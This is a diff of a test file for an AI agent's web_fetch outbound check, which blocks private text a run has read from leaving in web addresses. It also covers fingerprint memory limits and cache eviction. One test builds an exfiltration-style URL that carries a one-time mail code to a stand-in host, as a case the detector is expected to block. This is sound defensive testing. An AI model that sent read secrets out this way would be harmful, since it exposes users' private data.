@@ -1,6 +1,16 @@
 import { afterAll, beforeAll, describe, expect, test } from "bun:test";
 import { schema } from "@agenteschat/db";
-import { createWebToolSource, insertMessage, recordRead, type ToolContext } from "../src";
+import {
+  CACHED_BYTES,
+  createWebToolSource,
+  forgetRunReads,
+  holdsRunReads,
+  insertMessage,
+  outboundCached,
+  RUN_BYTES,
+  recordRead,
+  type ToolContext,
+} from "../src";
 import { type Fixture, setup } from "./fixtures";
 
 // ADR 0117: what a run read from private data never leaves in a web address; what anyone wrote or a tool gave does.
@@ -279,4 +289,60 @@ describe("web_fetch's outbound check", () => {
       expect((await webFetch(ctx, out)).data).toMatchObject({ code: "outbound.private_text" });
     });
   });
+});
+
+/** `n` characters of random letters and spaces: every 20 characters in a row new, the most fingerprints text makes. */
+const randomText = (n: number) =>
+  Buffer.from(crypto.getRandomValues(new Uint8Array(n)).map((b) => (b % 9 === 0 ? 32 : 97 + (b % 26)))).toString();
+const LOREM = "lorem ipsum dolor sit amet consectetur adipiscing elit sed do eiusmod tempor".split(" ");
+/** `n` characters of prose-like words. */
+const proseText = (n: number) => {
+  const words: string[] = [];
+  for (let len = 0; len < n; len += (words.at(-1) as string).length + 1) {
+    words.push(LOREM[Math.floor(Math.random() * LOREM.length)] as string);
+  }
+  return words.join(" ");
+};
+
+test("a private text read before 4 M other characters is still caught, and other addresses still open", async () => {
+  // Read live, with no stored steps: only the fingerprints hold the mail.
+  const ctx = await runWith("@dev check my inbox", []);
+  recordRead(ctx.runId, "mail_read", MAIL);
+  for (let i = 0; i < 5; i++) recordRead(ctx.runId, "read_file", proseText(1_000_000));
+  const leak = `https://x.io/v?c=${encodeURIComponent("448812 Use it within 10 minutes and never share")}`;
+  expect((await webFetch(ctx, leak)).data).toMatchObject({ code: "outbound.private_text" });
+  const own = `https://search.example.com/?q=${encodeURIComponent("kubernetes ingress annotations for websocket timeouts")}`;
+  expect((await webFetch(ctx, own)).isError).toBeUndefined();
+}, 60_000);
+
+test("one run's fingerprints stay within RUN_BYTES however much it reads", () => {
+  const run = crypto.randomUUID();
+  for (let i = 0; i < 6; i++) recordRead(run, "read_file", randomText(500_000));
+  expect(outboundCached(run).run).toBeGreaterThan(RUN_BYTES / 2);
+  expect(outboundCached(run).run).toBeLessThanOrEqual(RUN_BYTES);
+}, 60_000);
+
+test("the reads cache holds at most CACHED_BYTES of fingerprints: the least recently used runs go first", () => {
+  const big = randomText(1_200_000);
+  const [a, b, ...others] = Array.from({ length: CACHED_BYTES / RUN_BYTES + 1 }, () => crypto.randomUUID());
+  recordRead(a as string, "read_file", big);
+  recordRead(b as string, "read_file", big);
+  // Used again: b is now the least recently used.
+  recordRead(a as string, "read_file", "again");
+  for (const run of others) recordRead(run, "read_file", big);
+  const held = outboundCached();
+  expect(held.bytes).toBeLessThanOrEqual(CACHED_BYTES);
+  expect(held.runs).not.toContain(b as string);
+  expect(held.runs).toContain(a as string);
+}, 60_000);
+
+test("forgetting a run's reads frees what it held", () => {
+  const run = crypto.randomUUID();
+  recordRead(run, "read_file", MAIL);
+  expect(holdsRunReads(run)).toBe(true);
+  const before = outboundCached(run);
+  expect(before.run).toBeGreaterThan(0);
+  forgetRunReads(run);
+  expect(holdsRunReads(run)).toBe(false);
+  expect(outboundCached().bytes).toBe(before.bytes - before.run);
 });
